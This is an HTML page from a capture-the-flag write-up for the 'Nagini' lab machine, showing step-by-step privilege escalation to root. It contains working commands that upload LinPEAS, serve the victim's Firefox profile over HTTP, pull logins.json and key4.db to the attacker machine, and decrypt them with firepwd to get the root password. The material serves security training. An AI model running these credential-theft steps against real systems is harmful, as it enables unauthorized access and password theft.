<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>5.1.3 Privilege user "root" (Getting the 3rd flag)</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>5.1.3 Privilege user "root" (Getting the 3rd flag)</h1><br/><br />1. Installing <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">LinPEAS</a>.<br /><span style="indent:1;">LinPEAS is a script that search for possible paths to escalate privileges on Linux/Unix*/MacOS hosts. The checks are explained on </span><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation">book.hacktricks.xyz</a>.<br />   <br />2. On your Kali Machine create a “linpeas.sh” file with content of <a href="https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh">https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh</a>.<br />   <br />3. Copy the file to the victim&#39;s &quot;/tmp&#39; directory.<br />	<div class="codebox"><div class="codebox">kali@kali:~/nagini<span style="color:#0057ae;font-weight:400">$scp</span>&nbsp;linpeas.sh&nbsp;hermoine@192.168.12.21:/tmp<br /></div></div><br /><br />4. Connet via SSH to the victim&#39;s machine.<br />	<div class="codebox"><div class="codebox">kali@kali:~/nagini<span style="color:#0057ae;font-weight:400">$ssh</span>&nbsp;hermoine@192.168.12.21&nbsp;-i&nbsp;.ssh/id_rsa</div></div><br /><br />5. Change the “linpeas.sh” file permissions.<br />	<div class="codebox"><div class="codebox">hermoine@Nagini:~<span style="color:#0057ae;font-weight:400">$cd</span>&nbsp;/tmp<br />hermoine@Nagini:/tmp<span style="color:#0057ae;font-weight:400">$chmod</span>&nbsp;+x&nbsp;linpeas.sh</div></div><br /><br />6. Run “linepeas.sh” file with output file.<br />	<div class="codebox"><div class="codebox">hermoine@Nagini:/tmp$./linpeas.sh&nbsp;|&nbsp;tee&nbsp;output<br /></div></div><br /><br />	<span style="color:#ffa500;">Output:</span><br />	<a href=""><img src="images/503-1.png" alt="images/503-1.png" /></a><br />	<br />	We find out that we might have some credentials in our “Mozilla Store”.<br />	<br /><br />7. Getting credentials from &quot;Mozilla&quot;.<br />   1) Let&#39;s see what there is in the “Mozilla” directory.<br />		<div class="codebox"><div class="codebox">hermoine@Nagini:/tmp<span style="color:#0057ae;font-weight:400">$ls</span>&nbsp;/home/hermoine/.mozilla/firefox/g2mhbq0o.default/<br /></div></div><br /><br />		<span style="color:#ffa500;">Output:</span><br />		<a href=""><img src="images/503-2.png" alt="images/503-2.png" /></a><br />	<br />   2) There is a tool called “firepwd” which allows the action.<br />		Github: <a href="https://github.com/lclevy/firepwd">https://github.com/lclevy/firepwd</a><br />		It needs, “logins.json” and “key4.db”.<br />	<br />   3) Create a server on the <strong>“Victim machine”</strong> from the credential files can be downloaded.<br />   	   <div class="codebox"><div class="codebox">hermoine@Nagini:~<span style="color:#0057ae;font-weight:400">$cd</span>&nbsp;/home/hermoine/.mozilla/firefox/g2mhbq0o.default/<br />hermoine@Nagini:~/.mozilla/firefox/g2mhbq0o.default<span style="color:#0057ae;font-weight:400">$python3</span>&nbsp;-m&nbsp;http.server&nbsp;9000<br /></div></div> 	<br />      <br />       <span style="color:#ffa500;">Output:</span><br />       <a href=""><img src="images/503-3.png" alt="images/503-3.png" /></a><br /><br />   4) Install “firepwd” on the <strong>“Kali Machine”</strong>.<br />       <div class="codebox"><div class="codebox"><span style="color:#0057ae;font-weight:400">$git</span>&nbsp;clone&nbsp;https://github.com/lclevy/firepwd.git<br /><span style="color:#0057ae;font-weight:400">$cd</span>&nbsp;firepwd<br /><span style="color:#0057ae;font-weight:400">$pip</span>&nbsp;install&nbsp;-r&nbsp;requirements.txt&nbsp;pip&nbsp;install&nbsp;-r&nbsp;requirements.txt&nbsp;</div></div><br />      <br />       <span style="color:#ffa500;">Output:</span><br />       <a href=""><img src="images/503-4.png" alt="images/503-4.png" /></a><br />      <br />   5) Copy the “~/nagini/firepwd/firepwd.py” script to “creds” directory.<br />       <div class="codebox"><div class="codebox"><span style="color:#0057ae;font-weight:400">$mkdir</span>&nbsp;creds<br /><span style="color:#0057ae;font-weight:400">$cp</span>&nbsp;firepwd.py&nbsp;~/nagini/firepwd/creds/<br /><span style="color:#0057ae;font-weight:400">$cd</span>&nbsp;creds</div></div> <br />      <br />   6) From your Kali Machine download the credentials files.<br />      <br />       <div class="codebox"><div class="codebox"><span style="color:#0057ae;font-weight:400">$wget</span>&nbsp;http://192.168.12.21:9000/logins.json<br /><span style="color:#0057ae;font-weight:400">$wget</span>&nbsp;http://192.168.12.21:9000/key4.db</div></div><br />      <br />       <span style="color:#ffa500;">Output:</span><br />   	   <a href=""><img src="images/503-5.png" alt="images/503-5.png" /></a><br />   <br />   	   <a href=""><img src="images/503-6.png" alt="images/503-6.png" /></a><br />   <br />   7) Get the password. Remember you are in the “~/nagini/firepwd/creds” directory on your Kali Machine.<br />       <div class="codebox"><div class="codebox"><span style="color:#0057ae;font-weight:400">$python3</span>&nbsp;firepwd.py&nbsp;</div></div><br />      <br />      <span style="color:#ffa500;">Output:</span><br />      <a href=""><img src="images/503-7.png" alt="images/503-7.png" /></a><br />      <br />      At the end of the output you&#39;ll find the “root&#39;s” password. (@Alohomora#123).<br />      <br /><br />8. Connet via SSH with user &#39;root&quot;.<br /><br />	<div class="codebox"><div class="codebox"><span style="color:#0057ae;font-weight:400">$ssh</span>&nbsp;root@192.168.12.21<br /></div></div><br />	<br />	Passwword: @Alohomora#123<br /><br />	<span style="color:#ffa500;">Output:</span><br />	<a href=""><img src="images/503-8.png" alt="images/503-8.png" /></a><br />	<br />9. Let&#39;s see the last flag.<br />    <div class="codebox"><div class="codebox">root@Nagini:/#cd&nbsp;/root<br />root@Nagini:~#ls<br /></div></div><br /><br />	<span style="color:#ffa500;">Output:</span>   <br />    <a href=""><img src="images/503-9.png" alt="images/503-9.png" /></a><br />    <br />10. Show the file.<br />	<div class="codebox"><div class="codebox">root@Nagini:~#cat&nbsp;horcrux3.txt&nbsp;</div></div><br />	<br />	<span style="color:#ffa500;">Output:</span><br />	<a href=""><img src="images/503-10.png" alt="images/503-10.png" /></a><p align="center"><img src="images/home.svg" height="22" width="22">  <a href="index.html">Index</a></p></div></body></html>